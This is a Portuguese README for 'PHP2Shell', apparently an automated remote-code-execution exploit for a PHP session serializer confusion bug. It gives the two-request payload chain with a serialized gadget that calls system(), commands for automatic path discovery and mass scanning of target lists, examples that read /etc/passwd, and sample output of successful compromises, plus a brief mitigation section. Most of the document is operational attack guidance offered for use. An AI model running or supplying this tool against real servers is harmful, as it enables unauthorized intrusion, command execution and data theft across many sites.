PHP2Shell RCE Exploit
CVE-2026-109618 / CVE-2026-109619 — Session serialize_handler confusion via session.upload_progress yields unauthenticated RCE
Criado por VandaTheGod
---
 Visão Geral
O PHP2Shell é um exploit automático para uma vulnerabilidade de Remote Code Execution (RCE) que afeta servidores PHP que utilizam a configuração `session.upload_progress` com diferentes `serialize_handler` em caminhos distintos.
A ferramenta descobre automaticamente os diretórios vulneráveis, executa a cadeia de exploração e cria um arquivo de prova no servidor — tudo com um único comando.
---
 A Vulnerabilidade
O Problema
PHP permite configurar diferentes `session.serialize_handler` para diferentes diretórios:
Diretorio	serialize_handler	Função
`/seed/`	`php_serialize`	Grava objeto serializado
`/app/`	`php` (default)	Desserializa e executa
Mecanismo de Exploração
A vulnerabilidade ocorre em duas fases:
Fase 1 — Seed (Plantar o Payload)
```
POST /seed/
  Cookie: PHPSESSID=<sid>
  Body: PHP_SESSION_UPLOAD_PROGRESS = |O:6:"Logger":1:{s:3:"cmd";s:2:"id";}
```
O handler `php_serialize` grava o valor verbatim em `sess_<sid>`, incluindo o `|` e o objeto serializado.
Fase 2 — Fire (Disparar a Execução)
```
GET /app/
  Cookie: PHPSESSID=<sid>
```
O handler `php` divide no primeiro `|`, desserializa o objeto e executa `__destruct()`, que chama `system($cmd)`.
Por Que Funciona?
Fase 1: `php_serialize` não entende a sintaxe `|O:...`, então grava tudo como string
Fase 2: `php` divide em `|`, tenta desserializar `O:...`, mas os bytes seguintes (do upload original) falham no decode
Resultado: PHP destrói o objeto parcialmente construído → `__destruct()` é chamado → RCE
---
 Como Usar
Modo Automático (Recomendado)
Apenas informe o site — o exploit descobre os caminhos sozinho:
```bash
python3 php2shell_rce.py http://alvo.com
```
Modo em Lote (Lista de Sites)
Lê uma lista de alvos de arquivo `.txt` e salva resultados em CSV:
```bash
python3 php2shell_rce.py --targets sites.txt --output resultados.csv
```
Formato do arquivo de sites (`sites.txt`):
```
# Comentários começam com #
http://alvo1.com
http://alvo2.com:8080
127.0.0.1:8091
https://alvo3.com/app/
```
Modo Manual (Caminhos Específicos)
Se você já sabe os diretórios vulneráveis:
```bash
python3 php2shell_rce.py http://alvo.com --seed-path /upload/ --trigger-path /app/
```
Modo Restrito (Apenas o Caminho Informado)
Testa somente o caminho informado, sem varrer o host:
```bash
python3 php2shell_rce.py http://alvo.com/admin/ --strict-path
```
Executar Comando Personalizado
```bash
python3 php2shell_rce.py http://alvo.com --cmd 'cat /etc/passwd'
```
---
 Opções da CLI
Opção	Descrição
`site`	Alvo único (ex: `http://alvo.com`)
`--targets, -t`	Arquivo com lista de sites (um por linha)
`--output, -o`	Arquivo CSV para salvar resultados
`--seed-path`	Caminho do diretório `php_serialize` (modo manual)
`--trigger-path`	Caminho do diretório `php` (modo manual)
`--cmd`	Comando a executar no servidor (default: cria demo.txt)
`--gadget`	Classe gadget (default: `Logger`)
`--prop`	Propriedade com o comando (default: `cmd`)
`--field`	Nome do campo de progresso (default: `PHP_SESSION_UPLOAD_PROGRESS`)
`--sid`	Session ID fixo (opcional)
`--timeout`	Timeout em segundos (default: 20.0)
`--delay`	Delay entre alvos em modo lote (default: 0.5s)
`--strict-path`	Testa apenas o caminho informado (não varre o host)
`--verbose, -v`	Mostra cada tentativa de exploração
`--quiet, -q`	Apenas resultados no CSV (sem output no terminal)
---
 Estrutura do CSV de Resultados
O arquivo de saída contém as seguintes colunas:
Coluna	Descrição
`target`	URL do alvo testado
`status`	`SUCCESS` ou `FAIL`
`seed_path`	Caminho usado como seed (php_serialize)
`trigger_path`	Caminho usado como trigger (php)
`seed_url`	URL completa do seed
`trigger_url`	URL completa do trigger
`uid`	UID do usuário que executou o comando
`user`	Nome do usuário (ex: `www-data`)
`gid`	GID do grupo
`groups`	Grupos do usuário
`demo_files`	Arquivos criados no servidor
`timestamp`	Data/hora da execução
`output`	Saída do comando (truncada para 500 bytes)
`error`	Mensagem de erro (se falhou)
Exemplo de CSV
```csv
target,status,seed_path,trigger_path,seed_url,trigger_url,uid,user,gid,groups,demo_files,timestamp,output,error
http://127.0.0.1:8091,SUCCESS,/seed/,/app/,http://127.0.0.1:8091/seed/,http://127.0.0.1:8091/app/,33,www-data,33,33(www-data),/tmp/pwned_php2shell.txt; /var/tmp/pwned_php2shell.txt,2026-10-22 12:37:20,"== pwd: /var/www/php2shell/app
ls: cannot access '/var/www/php2shell/app/pwned_php2shell.txt': No such file or directory
-rw-r--r-- 1 www-data www-data 88 Oct 22 12:37 /tmp/pwned_php2shell.txt
-rw-r--r-- 1 www-data www-data 88 Oct 22 12:37 /var/tmp/pwned_php2shell.txt
== content ==
PHP2SHELL_RCE_109618
RCE via CVE-2026-109618 (PHP2Shell)
host: e2b.local
user: www-data
PHP2SHELL_RCE_109618
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[app] session started
",
http://127.0.0.1:9999,FAIL,,,,,,,,,,2026-10-22 12:37:20,,No working seed/trigger pair found
```
---
 Requisitos
Python 3.8+
Nenhuma dependência externa (usa apenas bibliotecas padrão)
Acesso HTTP/HTTPS ao alvo
---
 Estrutura do Projeto
```
cve109618/
├── php2shell_rce.py      # Exploit principal
├── README_EXPLOIT.md      # Este arquivo
├── sites_sample.txt       # Exemplo de lista de alvos
├── resultados.csv         # Resultados da execução
└── resultados_finais.csv  # Resultados consolidados de validação
```
---
 Fluxo de Exploração
```
┌─────────────────────────────────────────────────────────────┐
│                    PHP2Shell Exploit                        │
├─────────────────────────────────────────────────────────────┤
│  1. Recebe alvo(s)                                          │
│     ├─ Site único: http://alvo.com                         │
│     └─ Lista de sites: --targets sites.txt                 │
│                                                             │
│  2. Pré-sonda caminhos                                      │
│     ├─ Testa COMMON_PATHS (/app/, /upload/, /seed/, etc.)  │
│     ├─ Filtra caminhos que respondem (200, 302, 401, 403)  │
│     └─ Monta pares (seed, trigger) para testar              │
│                                                             │
│  3. Executa cadeia RCE                                      │
│     ├─ Fase 1 (POST): envia payload serializado             │
│     │   └─ PHP_SESSION_UPLOAD_PROGRESS = |O:...            │
│     ├─ Fase 2 (GET): força desserialização                  │
│     │   └─ Cookie: PHPSESSID=<sid>                         │
│     └─ Verifica resposta por marcador                      │
│                                                             │
│  4. Extrai informações                                      │
│     ├─ UID, user, GID, groups do comando 'id'              │
│     ├─ Caminhos dos arquivos demo criados                   │
│     └─ Output completo do comando                          │
│                                                             │
│  5. Salva resultados                                        │
│     └─ CSV com todas as informações                        │
└─────────────────────────────────────────────────────────────┘
```
---
 Exemplos de Uso
Exemplo 1: Exploração Rápida
```bash
python3 php2shell_rce.py http://127.0.0.1:8091
```
Output esperado:
```
  ____  _          ____  _   _ _        _ _     
 / ___|(_) __ _  / ___|| | | | | _____(_) | ___ 
| |  _| | |/ _` |\___ \| |_| | |/ / _ \ | |/ _ \
| |_| | | | (_| | ___) |  _  |   <  __/ | | (_) |
 \____|_|_|\__,_|____/ |_| |_|_|\_\___|_|_|\___/ 
                                                 
   PHP2Shell RCE Exploit (CVE-2026-109618/109619)
   Criado por VandaTheGod

[1/1] Testando: http://127.0.0.1:8091

============================================================
RESUMO: 1 alvos testados em 0.5s
  SUCCESS: 1
  FAIL:    0
============================================================

[SUCCESS] Alvos com RCE: 
  alvo=http://127.0.0.1:8091
     seed (php_serialize): http://127.0.0.1:8091/seed/
     trigger (php)       : http://127.0.0.1:8091/app/
     usuario=www-data (uid=33)  arquivos=/tmp/pwned_php2shell.txt; /var/tmp/pwned_php2shell.txt
```
Exemplo 2: Varredura em Lote
```bash
python3 php2shell_rce.py --targets targets.txt --output resultados.csv --delay 0.5 -v
```
Exemplo 3: Comando Personalizado
```bash
python3 php2shell_rce.py http://alvo.com --cmd 'whoami && hostname && cat /etc/passwd'
```
Exemplo 4: Modo Verbose
```bash
python3 php2shell_rce.py http://alvo.com -v
```
Mostra cada tentativa de par (seed, trigger) testado.
---
 Mitigação
Para Desenvolvedores
Use um único `serialize_handler` para todos os diretórios de sessão
Desabilite `session.upload_progress` se não for necessário
Valide e sanitize todos os inputs de sessão
Use `session.save_path` isolado por aplicação
Para Administradores
```ini
; php.ini
session.serialize_handler = php
session.upload_progress.enabled = Off
; OU
session.upload_progress.cleanup = On
```
.htaccess (Apache)
```apache
php_value session.serialize_handler php
php_value session.upload_progress.cleanup On
```
---
 Notas Técnicas
Por Que `www-data`?
O Apache geralmente roda como `www-data` (Debian/Ubuntu) ou `apache` (RHEL/CentOS). O exploit executa comandos com o mesmo usuário do processo do servidor web.
PrivateTmp e /tmp
Em sistemas modernos com `systemd PrivateTmp=true`, o `/tmp` do Apache é um namespace privado. Isso significa que:
O arquivo criado pelo RCE fica em `/tmp/systemd-private-*/tmp/`
O shell do usuário não vê o arquivo em `/tmp/` diretamente
Isso confirma que a execução ocorreu genuinamente no processo do Apache
Deduplicação Automática
O exploit deduplica alvos por host:
`127.0.0.1:8091` e `http://127.0.0.1:8091` → testados uma vez
Preserva a ordem original da lista
---
 Troubleshooting
"No working seed/trigger pair found"
Causas possíveis:
O alvo não está vulnerável
Os caminhos de seed/trigger estão diferentes dos esperados
Firewall/WAF bloqueando as requisições
Soluções:
Use `--verbose` para ver quais pares foram testados
Use `--seed-path` e `--trigger-path` se souber os caminhos
Aumente `--timeout` se o servidor for lento
"Connection refused"
Causas:
Servidor desligado
Porta incorreta
Firewall bloqueando
Solução: Verifique se o alvo está acessível com `curl` ou `nmap`.
CSV vazio ou incompleto
Causa: Interrupção durante a execução
Solução: O CSV é gravado incrementalmente — os resultados já processados estão salvos.
---
 Licença
MIT License — Use por sua conta e risco.
---

CVEs: CVE-2026-109618, CVE-2026-109619
Descoberta: Confusão de `session.serialize_handler` via `session.upload_progress`
---
 Referências
PHP Session Handlers
PHP Upload Progress
Object Injection in PHP
---
 Checklist de Validação
[x] Modo automático (descobre caminhos sozinho)
[x] Modo em lote (lista de sites)
[x] Modo manual (caminhos específicos)
[x] Modo restrito (apenas caminho informado)
[x] CSV com resultados detalhados
[x] Deduplicação de alvos
[x] Gravação incremental (não perde progresso)
[x] Banner com autor
[x] Exit code apropriado (0 = sucesso, 1 = falha)
[x] Sem falso positivo em app corrigido
---
Uso apenas em sistemas autorizados.
---
